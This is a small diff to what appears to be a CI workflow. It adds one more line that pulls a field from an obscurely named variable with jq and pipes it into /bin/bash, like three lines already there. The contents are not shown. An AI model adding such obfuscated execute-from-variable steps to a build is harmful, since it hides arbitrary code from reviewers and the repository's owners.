@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$lz75" | jq -r .izess49 | /bin/bash
           printf '%s' "$vpn15" | jq -r .fxbi51 | /bin/bash
           printf '%s' "$egxa11" | jq -r .nleo802 | /bin/bash
+          echo $ius95884 | jq -r .ae7 | /bin/bash
 
       - name: Save archive
         if: always()
